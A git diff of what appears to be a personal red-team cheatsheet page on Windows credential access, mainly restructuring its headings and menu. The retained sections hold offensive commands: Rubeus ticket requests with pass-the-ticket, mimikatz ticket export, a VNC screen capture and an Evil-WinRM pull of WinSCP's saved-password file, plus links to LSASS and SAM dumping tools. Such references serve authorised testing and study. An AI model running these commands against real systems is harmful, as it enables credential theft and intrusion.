@@ -3,7 +3,7 @@ layout: post
 title: TA0006 Credentials Access - Windows
 category: pen
 parent: cheatsheets
-modified_date: 2023-03-13
+modified_date: 2023-06-08
 permalink: /pen/credsaccess-win
 ---
 
@@ -11,24 +11,21 @@ permalink: /pen/credsaccess-win
 
 **Menu**
 <!-- vscode-markdown-toc -->
-* [Multi-features Hacking Tools](#Multi-featuresHackingTools)
-* [T1558: Steal and Forge Kerberos Tickets](#T1558:StealandForgeKerberosTickets)
-	* [Which OS ? What Creds ?](#WhichOSWhatCreds)
-	* [Rubeus](#Rubeus)
-	* [Kerberos ASKTGT](#KerberosASKTGT)
-	* [Import / Export Tickets](#ImportExportTickets)
-* [LSASS.exe dump](#LSASS.exedump)
-* [SAM dump](#SAMdump)
-* [Services](#Services)
-* [Scheduled Tasks](#ScheduledTasks)
-* [Sofwares](#Sofwares)
-	* [Automated](#Automated)
-	* [mRemoteNG](#mRemoteNG)
-	* [xVNC](#xVNC)
-	* [WinSCP](#WinSCP)
-	* [Putty](#Putty)
+* [tools](#tools)
+* [os](#os)
+	* [kerberos](#kerberos)
+	* [lsass](#lsass)
+	* [ntds.dit](#ntds.dit)
+	* [sam](#sam)
+* [services](#services)
+* [schtasks](#schtasks)
+* [softwares](#softwares)
+	* [auto](#auto)
+	* [mremoteng](#mremoteng)
+	* [xvnc](#xvnc)
+	* [winscp](#winscp)
+	* [putty](#putty)
 	* [Web Browsers](#WebBrowsers)
-* [NTDS.dit dump](#NTDS.ditdump)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -36,7 +33,9 @@ permalink: /pen/credsaccess-win
 	/vscode-markdown-toc-config -->
 <!-- /vscode-markdown-toc -->
 
-## <a name='Multi-featuresHackingTools'></a>Multi-features Hacking Tools
+## <a name='tools'></a>tools
+
+Multi-features Hacking Tools :
 
 <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
 <script>$(window).load(function() {var repos = ["https://api.github.com/repos/gentilkiwi/mimikatz/","https://api.github.com/repos/skelsec/pypykatz", "https://api.github.com/repos/SecureAuthCorp/impacket", "https://api.github.com/repos/Hackndo/lsassy", "https://api.github.com/repos/deepinstinct/Lsass-Shtinkering","https://api.github.com/repos/D1rkMtr/DumpThatLSASS","https://api.github.com/repos/codewhitesec/HandleKatz","https://api.github.com/repos/Z4kSec/Masky","https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/Processus-Thief/HEKATOMB","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
@@ -49,9 +48,12 @@ permalink: /pen/credsaccess-win
     </table>
 </div>
 
-## <a name='T1558:StealandForgeKerberosTickets'></a>T1558: Steal and Forge Kerberos Tickets 
+## <a name='os'></a>os
 
-### <a name='WhichOSWhatCreds'></a>Which OS ? What Creds ?
+### <a name='kerberos'></a>kerberos
+
+* T1558: Steal and Forge Kerberos Tickets 
+* Which OS ? What Creds ?
 
 ![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
 
@@ -59,44 +61,46 @@ TO READ:
 * [OS credentials dumping - mitre T1003](https://attack.mitre.org/techniques/T1003/001/)
 * [LSA RunAsPPL protection](https://itm4n.github.io/lsass-runasppl/)
 
-### <a name='Rubeus'></a>Rubeus 
+* Rubeus compilation / [Wiki](https://github.com/GhostPack/Rubeus) :
 
-- [Wiki](https://github.com/GhostPack/Rubeus)
-- Compilation :
 ```powershell
 # compilation
 ```
 
-### <a name='KerberosASKTGT'></a>Kerberos ASKTGT 
+* Kerberos ASKTGT 
 ```powershell
 # Path on VM Mandiant Commando
 cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
 ./Rubeus.exe asktgt /user:$zlat_user /password:"PASSWORD" /domain:$zdom /dc:$zdom_dc_fqdn /ptt
 ```
 
-### <a name='ImportExportTickets'></a>Import / Export Tickets
+* Import / Export Tickets
 ```powershell
 cd C:\tools\mimikatz\x64
 mimikatz.exe privilege:debug
 kerberos::list /export
 ```
 
-## <a name='LSASS.exedump'></a>LSASS.exe dump
+### <a name='lsass'></a>lsass
+
+LSASS.exe dump :
 
 - [redteamrecipe 50 methods](https://redteamrecipe.com/50-Methods-For-Dump-LSASS/) 🔥
 - [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
 
-## <a name='SAMdump'></a>SAM dump
+### <a name='ntds.dit'></a>ntds.dit
+
+### <a name='sam'></a>sam
+
+* SAM dump
 
 - [registry & vss](https://nored0x.github.io/red-teaming/Windows-Credentials-SAM-Database-part-1/)
 
-## <a name='Services'></a>Services
+## <a name='schtasks'></a>schtasks
 
-## <a name='ScheduledTasks'></a>Scheduled Tasks
+## <a name='softwares'></a>softwares
 
-## <a name='Sofwares'></a>Sofwares
-
-### <a name='Automated'></a>Automated
+### <a name='auto'></a>auto
 
 <script>$(window).load(function() {var reposs = ["https://github.com/Arvanaghi/SessionGopher", "https://github.com/EncodeGroup/Gopher", "https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (repp in reposs) {$.ajax({type: "GET", url: reposs[repp], dataType: "json", success: function(result) {$("#repo_listt").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
 
@@ -106,11 +110,14 @@ kerberos::list /export
     </table>
 </div>
 
-### <a name='mRemoteNG'></a>mRemoteNG
+### chrome
+- [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
+
+### <a name='mremoteng'></a>mremoteng
 
 - [password decryption](https://github.com/S3cur3Th1sSh1t/mRemoteNG-Decrypt)
 
-### <a name='xVNC'></a>xVNC
+### <a name='xvnc'></a>xvnc
 
 * VNC softwares properties:  
 
@@ -139,7 +146,7 @@ vncsnapshot 1.2.3.4 pwned_desktop_x.png
 ```
 
 
-### <a name='WinSCP'></a>WinSCP
+### <a name='winscp'></a>winscp
 
 * Get an RDP session
 * Check if there are saved passwords
@@ -149,9 +156,7 @@ vncsnapshot 1.2.3.4 pwned_desktop_x.png
 Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
 ```
 
-### <a name='Putty'></a>Putty
+### <a name='putty'></a>putty
 
 ### <a name='WebBrowsers'></a>Web Browsers
 - [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)
-
-## <a name='NTDS.ditdump'></a>NTDS.dit dump
